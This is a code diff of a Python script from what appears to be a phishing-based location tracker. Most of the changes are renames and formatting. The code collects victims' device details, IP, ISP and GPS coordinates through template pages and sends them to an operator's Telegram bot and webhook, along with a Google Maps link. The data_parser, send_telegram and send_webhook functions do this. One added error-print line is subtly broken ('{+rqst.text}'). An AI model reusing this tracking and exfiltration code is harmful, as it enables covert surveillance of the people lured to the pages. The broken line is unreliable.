@@ -9,6 +9,7 @@ W = '\033[0m'   # white
 Y = '\033[33m'  # yellow
 
 import sys
+import utils
 import argparse
 import requests
 import traceback
@@ -18,8 +19,6 @@ import time
 from os import path, kill, mkdir, getenv, environ
 from json import loads, decoder
 from packaging import version
-import utils
-import urllib.parse
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-k', '--kml', help='KML filename')
@@ -27,24 +26,24 @@ parser.add_argument('-p', '--port', type=int, default=8080, help='Web server por
 parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
 parser.add_argument('-v', '--version', action='store_true', help='Prints version')
 parser.add_argument('-t', '--template', type=int, help='Load template and loads parameters from env variables')
-parser.add_argument('-d', '--debugHTTP', type=bool, default = False, help='Disable HTTPS redirection for testing only')
-parser.add_argument('--telegram', help='Telegram token and chat to use to send results to a telegram bot (format = token:chatId)')
-parser.add_argument('--webhook', help='URL of the webhook to forward the events to (POST method and unauthentified)')
+parser.add_argument('-d', '--debugHTTP', type=bool, default=False, help='Disable HTTPS redirection for testing only')
+parser.add_argument('-tg', '--telegram', help='Telegram bot API token [ Format -> token:chatId ]')
+parser.add_argument('-wh', '--webhook', help='Webhook URL [ POST method & unauthenticated ]')
 
 args = parser.parse_args()
 kml_fname = args.kml
-port = getenv("PORT") or args.port
+port = getenv('PORT') or args.port
 chk_upd = args.update
 print_v = args.version
-telegram = getenv("TELEGRAM") or args.telegram
-webhook = getenv("WEBHOOK") or args.webhook
+telegram = getenv('TELEGRAM') or args.telegram
+webhook = getenv('WEBHOOK') or args.webhook
 
-if (getenv("DEBUG_HTTP") and (getenv("DEBUG_HTTP") == "1" or getenv("DEBUG_HTTP").lower() == "true")) or args.debugHTTP == True:
-	environ["DEBUG_HTTP"] = "1"
+if (getenv('DEBUG_HTTP') and (getenv('DEBUG_HTTP') == '1' or getenv('DEBUG_HTTP').lower() == 'true')) or args.debugHTTP is True:
+	environ['DEBUG_HTTP'] = '1'
 else:
-	environ["DEBUG_HTTP"] = "0"
+	environ['DEBUG_HTTP'] = '0'
 
-templateNum = int(getenv("TEMPLATE")) if getenv("TEMPLATE") and getenv("TEMPLATE").isnumeric() else args.template
+templateNum = int(getenv('TEMPLATE')) if getenv('TEMPLATE') and getenv('TEMPLATE').isnumeric() else args.template
 
 path_to_script = path.dirname(path.realpath(__file__))
 
@@ -66,6 +65,7 @@ if not path.isdir(LOG_DIR):
 
 if not path.isdir(DB_DIR):
 	mkdir(DB_DIR)
+
 
 def chk_update():
 	try:
@@ -94,6 +94,7 @@ if print_v is True:
 	sys.exit()
 
 import importlib
+import urllib.parse
 from csv import writer
 from time import sleep
 import subprocess as subp
@@ -120,35 +121,39 @@ def banner():
 	utils.print(f'{G} |---> {C}Community : {W}{comms_url}')
 	utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')
 
-def sendWebhook(content):
+
+def send_webhook(content):
 	if webhook is not None:
-		if not webhook.lower().startswith("http://") and not webhook.lower().startswith("https://"):
+		if not webhook.lower().startswith('http://') and not webhook.lower().startswith('https://'):
 			utils.print(f'{R}[-] {C}Provided webhook endpoint is not correct should be http or https scheme, on a POST method and unauthenfied{W}')
 			return
 		cpt = 3
 		for i in range(cpt):
-			r = None
+			rqst = None
 			try:
-				r = requests.post(webhook, json=content)
-			except:
-				r = None
-			if r and r.ok:
+				rqst = requests.post(webhook, json=content)
+			except Exception:
+				rqst = None
+			if rqst and rqst.ok:
 				return
 			time.sleep(i + 1)
 		utils.print(f'{R}[-] {C}Unable to reach the webhook endpoint, ensure it listens on a POST method and unauthenfied{W}')
 
-def sendTelegram(content):
+
+def send_telegram(content):
 	if telegram is not None:
 		tmpsplit = telegram.split(':')
-		if len(tmpsplit) <3:
+		if len(tmpsplit) < 3:
 			utils.print(f'{R}[-] {C}Provided Telegram bot information invalid : expected format is token:chatId (with colon){W}')
 			return
 		content = re.sub('\33\[\d+m', ' ', content)
-		r = requests.get('https://api.telegram.org/bot'+tmpsplit[0]+':'+tmpsplit[1]+'/sendMessage?chat_id='+tmpsplit[2]+'&text='+urllib.parse.quote_plus(content))
-		if r:
+		api_target_url = f'https://api.telegram.org/bot{tmpsplit[0]}:{tmpsplit[1]}/sendMessage?chat_id={tmpsplit[2]}&text={urllib.parse.quote_plus(content)}'
+		rqst = requests.get(api_target_url)
+		if rqst:
 			utils.print(f'{G}[+] {C}Successfully sent to Telegram bot {W}')
 		else:
-			utils.print(f'{R}[-] {C}Unable to send to Telegram bot {W}'+r.status_code+" => "+r.text)
+			utils.print(f'{R}[-] {C}Unable to send to Telegram bot {W}\n{rqst.status_code} => {+rqst.text}')
+
 
 def template_select(site):
 	utils.print(f'{Y}[!] Select a Template :{W}\n')
@@ -190,14 +195,13 @@ def template_select(site):
 
 	imp_file = templ_json['templates'][selected]['import_file']
 	importlib.import_module(f'template.{imp_file}')
-	shutil.copyfile("php/error.php", 'template/{}/error_handler.php'.format(templ_json['templates'][selected]["dir_name"]))
-	shutil.copyfile("php/info.php", 'template/{}/info_handler.php'.format(templ_json['templates'][selected]["dir_name"]))
-	shutil.copyfile("php/result.php", 'template/{}/result_handler.php'.format(templ_json['templates'][selected]["dir_name"]))
-	jsdir = 'template/{}/js'.format(templ_json['templates'][selected]["dir_name"])
+	shutil.copyfile('php/error.php', f'template/{templ_json["templates"][selected]["dir_name"]}/error_handler.php')
+	shutil.copyfile('php/info.php', f'template/{templ_json["templates"][selected]["dir_name"]}/info_handler.php')
+	shutil.copyfile('php/result.php', f'template/{templ_json["templates"][selected]["dir_name"]}/result_handler.php')
+	jsdir = f'template/{templ_json["templates"][selected]["dir_name"]}/js'
 	if not path.isdir(jsdir):
 		mkdir(jsdir)
-	shutil.copyfile("js/location.js", jsdir+'/location.js')
-	
+	shutil.copyfile('js/location.js', jsdir + '/location.js')
 	return site
 
 
@@ -269,7 +273,7 @@ def data_parser():
 		var_ip = info_json['ip']
 
 		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])
-		deviceInfo = f'''{Y}[!] Device Information :{W}
+		device_info = f'''{Y}[!] Device Information :{W}
 
 {G}[+] {C}OS         : {W}{var_os}
 {G}[+] {C}Platform   : {W}{var_platform}
@@ -281,9 +285,9 @@ def data_parser():
 {G}[+] {C}Browser    : {W}{var_browser}
 {G}[+] {C}Public IP  : {W}{var_ip}
 '''
-		sendTelegram(deviceInfo)
-		sendWebhook(info_json)
-		utils.print(deviceInfo)
+		send_telegram(device_info)
+		send_webhook(info_json)
+		utils.print(device_info)
 
 		if ip_address(var_ip).is_private:
 			utils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
@@ -302,7 +306,7 @@ def data_parser():
 				var_isp = str(data['isp'])
 
 				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])
-				ipInfo = f'''{Y}[!] IP Information :{W}
+				ip_info = f'''{Y}[!] IP Information :{W}
 
 {G}[+] {C}Continent : {W}{var_continent}
 {G}[+] {C}Country   : {W}{var_country}
@@ -311,8 +315,8 @@ def data_parser():
 {G}[+] {C}Org       : {W}{var_org}
 {G}[+] {C}ISP       : {W}{var_isp}
 '''
-				sendTelegram(ipInfo)
-				utils.print(ipInfo)
+				send_telegram(ip_info)
+				utils.print(ip_info)
 
 	with open(RESULT, 'r') as result_file:
 		results = result_file.read()
@@ -322,7 +326,7 @@ def data_parser():
 			utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
 		else:
 			status = result_json['status']
-			sendWebhook(result_json)
+			send_webhook(result_json)
 			if status == 'success':
 				var_lat = result_json['lat']
 				var_lon = result_json['lon']
@@ -332,7 +336,7 @@ def data_parser():
 				var_spd = result_json['spd']
 
 				data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
-				locInfo = f'''{Y}[!] Location Information :{W}
+				loc_info = f'''{Y}[!] Location Information :{W}
 
 {G}[+] {C}Latitude  : {W}{var_lat}
 {G}[+] {C}Longitude : {W}{var_lon}
@@ -341,19 +345,18 @@ def data_parser():
 {G}[+] {C}Direction : {W}{var_dir}
 {G}[+] {C}Speed     : {W}{var_spd}
 '''
-				sendTelegram(locInfo)
-				utils.print(locInfo)
-				
-				googleMaps = f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
-				sendTelegram(googleMaps)
-				utils.print(googleMaps)
+				send_telegram(loc_info)
+				utils.print(loc_info)
+				gmaps_url = f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
+				send_telegram(gmaps_url)
+				utils.print(gmaps_url)
 
 				if kml_fname is not None:
 					kmlout(var_lat, var_lon)
 			else:
 				var_err = result_json['error']
 				errmsg = f'{R}[-] {C}{var_err}\n'
-				sendTelegram(errmsg)
+				send_telegram(errmsg)
 				utils.print(errmsg)
 
 	csvout(data_row)
